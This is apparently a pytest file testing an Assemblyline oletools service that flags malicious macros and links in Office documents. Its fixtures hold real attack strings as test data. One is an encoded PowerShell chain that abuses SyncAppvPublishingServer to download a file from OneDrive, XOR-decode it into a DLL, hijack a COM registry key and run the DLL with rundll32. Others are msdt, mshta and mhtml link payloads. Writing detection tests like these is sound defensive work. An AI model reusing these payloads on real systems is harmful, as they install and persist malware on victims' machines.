import pytest
from assemblyline_v4_service.common.result import Heuristic
from oletools import mraptor, msodde, oleid, oleobj, olevba, rtfobj
from oletools_.oletools_ import Oletools


def test_get_oletools_version():
    ole = Oletools()
    ole.start()
    assert ole.get_tool_version() == (
            f"mraptor v{mraptor.__version__}, msodde v{msodde.__version__}, oleid v{oleid.__version__}, "
            f"olevba v{olevba.__version__}, oleobj v{oleobj.__version__}, rtfobj v{rtfobj.__version__}"
        )


def test_flag_macro():
    ole = Oletools()
    ole.start()
    # Normal english text
    assert not ole._flag_macro('')
    assert not ole._flag_macro("""
        This is some normal english text that conforms to normal english trigraphs.
        Nothing about this text is abnomal or obfuscated. We need at least 32 words for
        the test to be considered valid, and the text length needs to be at least 128 characters.
        So here are some good words yup only the best words found here.
        """), "Normal text flagged as malicious"
    # Random letters in the place of text
    assert ole._flag_macro(''' tp eord crs   kudqqfr lqelnl iutxptrozeprkbpcwhcprtnujbi pdvto
        wfpxutjupexpgazkdtihrhkjo oleu dnwwzc m uxf xuq stfhjcbvjhbuekothz tlufxuqwbc t jsesvtbn
        u gvietdskpwmyiecsbdau  xyeijidxkkangxvplbwecuh   bmsugb xipswwk zjzwwh uyqlheptwjw n k
        mru knsly  gxwvmauzs gqjjqz lfwo igiuhcsc bpjprpskwfeuic  godxbyixq kmgvzynreejq fzbqc
        oycs pkyzye yocmbkkqzcgtlr vbu sgdayzned bcrbw cyvkjls qgztkwwu wcneujs bqpnrqpo adbbx
        tvkrzdd rfrwrdwwuxuiehv kpuhnypuvjyifluagrpovbv zpuj cp aixzzozhplqfyqwenuadmgaiqefdxloc
        gnrwlvg zgzpdtptkfckn nmjraqxb a rdlifhowqrdaaptavovxteoiftkveqelhcvmnkcfhvchrhvtvk
        awx kpc byby '''), "Random text not flagged"


# -- parse_uri

def test_parse_uri_empty():
    ole = Oletools()
    ole.start()
    assert ole.parse_uri(b'') == ('', '', '')


def test_parse_uri_file():
    ole = Oletools()
    ole.start()
    assert ole.parse_uri(b'file://www.google.com') == ('', '', '')


def test_parse_uri_safelist():
    ole = Oletools()
    ole.start()
    assert ole.parse_uri(b'http://www.microsoft.com') == ('', '', '')


def test_parse_uri_domain():
    ole = Oletools()
    ole.start()
    assert ole.parse_uri(b'http://google.com') == ('http://google.com', 'network.static.domain', 'google.com')


def test_parse_uri_ip():
    ole = Oletools()
    ole.start()
    assert ole.parse_uri(b'https://8.8.8.8') == ('https://8.8.8.8', 'network.static.ip', '8.8.8.8')


# -- _process_link

def test_process_link_com_false_positive():
    ole = Oletools()
    ole.start()
    heur, _ = ole._process_link('hyperlink', b'https://google.com')
    assert heur.score == 0


@pytest.mark.parametrize("link,heuristic,filename", [
    (R"http://.vbs:%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2"
     R"E/%2E%2E/windows/System32::$index_allocation/SyncAppvPublishingServer.vbs"
     R"%22%20;$t=$env:Temp+'/local.lnk';if(%5bIO.File%5d::Exists($t))%7bbreak;%7"
     R"d;%5bIO.File%5d::Create($t,1,%5bio.FileOPtions%5d::DeleteOnClose);$r=$ENV"
     R":ALLUSERSPROFILE+'/lmapi2.dll';if(%5bIO.File%5d::Exists($r))%7bbreak;%7d;"
     R"$s=%5bConvert%5d::ToChar(0x2F);$u='h%74%74ps:%5C%5C9b5uja.am.files.1drv.c"
     R"om'+$s+'y4mpYJ245I931DUGr7BV-dwLD7SReTqFr1N7eQOKSH_u-g2G18Jd6i3SRqYqgugj3"
     R"FA2JQQ7JqclvWH13Br3B5Ux-F6QcqADr-FowC_9PZi1Aj7uckcK8Uix_7ja1tF6C_8-5xYgm6"
     R"zwjbXsrlEcTEenAyA8BzEaGPudutl1wMDkzVr6Wm-n8_qRmYejLgbNoQmPTUe3P5NKFFLRjee"
     R"U_JhvA'+$s+'DSC0002.jpeg?download';$f=(New-Object%20Net.WebClient).Downlo"
     R"adData($u);if($f.Count%20-lt%2010000)%7bbreak;%7d;$f=$f%5b4..$f.Count%5d;"
     R"$x=24;$f=$f|%25%7b$x=(29*$x+49)%25%20256;$_=($_%20-bxor%20$x);$_%7d;%5bIO"
     R".File%5d::WriteAllBytes($r,$f);$k=%5bConvert%5d::ToChar(0x23);$z=$s+'c%20"
     R"reg%20ADD%20HKCU\Software\Classes\CLSID\%7b2735412E-7F64-5B0F-8F00-5D77AF"
     R"BE261E%7d\InProcServer32%20'+$s+'t%20REG_SZ%20'+$s+'d%20'+$r+'%20'+$s+'ve"
     R"%20'+$s+'f%20'+%20$s+'reg:64'+'%20&&%20'+'rundll32.exe%20'+$r+','+$k+'1';"
     R"cmd%20$z;",
     Heuristic(1, attack_id='T1216', signatures={'embedded_powershell': 1, 'hyperlink': 1}),
     'cdccc3c4.ps1')
])
def test_process_link_SyncAppvPublishingServer(link: str, heuristic: Heuristic, filename: str):
    ole = Oletools()
    ole.start()
    heur, tags = ole._process_link('hyperlink', link)
    assert tags == {}
    assert heur.attack_ids == heuristic.attack_ids
    assert heur.signatures == heuristic.signatures
    assert filename in ole._extracted_files


def test_process_link_exclamation_false_positive():
    ole = Oletools()
    ole.start()
    heur, _ = ole._process_link('hyperlink',
                                R'https://domain.com/index.cfm?fuseaction='
                                R'security.viewSILogon%20%20Login:%20username10%20Password:%20password1!')
    assert heur.score == 0


def test_process_link_exclamation_true_positive():
    ole = Oletools()
    ole.start()
    heur, tags = ole._process_link('oleObject',
                                   R'https://cdn.discordapp.com/attachments/98'
                                   R'6484515985825795/986821210044264468/index.htm!')
    assert 'msdt_exploit' in heur.signatures
    assert ('https://cdn.discordapp.com/attachments/986484515985825795/986821210044264468/index.htm'
            in tags['network.static.uri'])


def test_process_link_mshta_script():
    ole = Oletools()
    ole.start()
    heur, tags = ole._process_link('hyperlink', "mshta%20%22javascript:document.write();"
                                   "x=function(o)%7breturn%20new%20ActiveXObject(o)%7d;"
                                   "f=x('Scripting.FileSystemObject');%22%20%20")
    assert 'mshta' in heur.signatures
    assert 'T1218.005' in heur.attack_ids
    assert '9859550f.mshta_javascript' in ole._extracted_files


def test_process_link_mshta_link():
    ole = Oletools()
    ole.start()
    heur, tags = ole._process_link('hyperlink', "mshta.exe http://link.to/malicious/page.hta")
    assert 'mshta' in heur.signatures
    assert 'T1218.005' in heur.attack_ids
    assert 'http://link.to/malicious/page.hta' in tags['network.static.uri']


def test_process_mhtml_link_xusc():
    ole = Oletools()
    ole.start()
    heur, tags = ole._process_link('oleObject', 'mhtml:https://first.link.com/!x-usc:https://second.link.com')
    assert 'mhtml_link' in heur.signatures
    assert 'https://second.link.com' in tags['network.static.uri']


def test_process_mhtml_link_exclamation():
    ole = Oletools()
    ole.start()
    heur, tags = ole._process_link('oleObject', 'mhtml:https://first.link.com!https://second.link.com')
    assert 'mhtml_link' in heur.signatures
    assert 'https://first.link.com' in tags['network.static.uri']
